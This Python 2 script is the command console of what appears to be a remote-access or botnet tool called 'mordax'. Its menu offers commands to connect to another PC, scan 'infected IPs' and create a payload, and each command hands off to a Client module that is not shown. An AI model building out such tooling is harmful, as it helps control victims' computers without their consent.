import os
import Client
from multiprocessing.pool import ThreadPool
pool = ThreadPool(processes=1)


class Console(Client.Client):

    def start(self):

        client = Client.Client()
        os.system("cls")

        print("                         .___              ")
        print("  _____   ___________  __| _/____  ___  ___")
        print(" /     \ /  _ \_  __ \/ __ |\__  \ \  \/  /")
        print("|  Y Y  (  <_> )  | \/ /_/ | / __ \_>    < ")
        print("|__|_|  /\____/|__|  \____ |(____  /__/\_ |")
        print("      \/                  \/     \/      \/")
        print("                                           ")
        print("                                           ")
        print("                                           ")
        print("                                           ")
        print("                                           ")


        x = raw_input("<command>: ")
        x = str(x)


        if x == "help":
            print("connect          connect to another pc")
            print("                                      ")
            print("scan             scan infected IPs    ")
            print("                                      ")
            print("help             showes help          ")
            print("                                      ")
            os.system("pause")
            self.start()
        elif x == "connect":
            client.connect(0)
        elif x == "scan":
           client.scan("none")
        elif x == "scan -log":
            client.scan("log")
        elif x == "payload":
            client.create_payload()
        else:
            print("command not found")
            self.start()
Con = Console()
Con.start()